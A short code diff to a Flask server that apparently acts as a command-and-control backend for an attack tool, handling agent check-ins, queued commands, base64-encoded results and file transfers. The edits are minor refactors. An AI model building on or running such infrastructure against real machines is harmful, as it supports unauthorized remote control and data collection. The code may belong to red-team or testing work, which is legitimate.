@@ -23,7 +23,6 @@ SEND_CMD_ROUTE = "commands.send_command"
 def start():
     """Agent checks in to verify start of attack"""
     # TODO: Register check in with server
-    # , status=201
     try:
         if SecurityConfig.INIT_ATTACK:
             return jsonify(OK), 200
@@ -43,8 +42,10 @@ def get_agent_commands():
         try:
             for res in request.get_json():
                 data = base64.b64decode(res['result']).decode('utf-8')
-                saved = update_response(res['id'], data, agent.id)
-            return jsonify(OK), 200 if saved else jsonify(ERROR), 500 # ERROR?
+            if update_response(res['id'], data, agent.id):
+                return jsonify(OK), 200
+            else:
+                return jsonify(ERROR), 500 
         except Exception as e:
             print(str(e))
         return jsonify(ERROR), 500
@@ -175,7 +176,7 @@ def cancel_command(cmd_id):
 
 
 
-def build_cmds(cmds, file_name=None, file_bytes=None):
+def build_cmds(cmds, filename=None, filebytes=None):
     new_cmds = []
     for c in cmds:
         cmd = c.command
@@ -189,8 +190,8 @@ def build_cmds(cmds, file_name=None, file_bytes=None):
             "id": c.id,
             "command": command,
             "arguments": args,
-            "file_name": file_name,
-            "file_bytes": file_bytes
+            "filename": filename,
+            "filebytes": filebytes
             }
         )
     return new_cmds
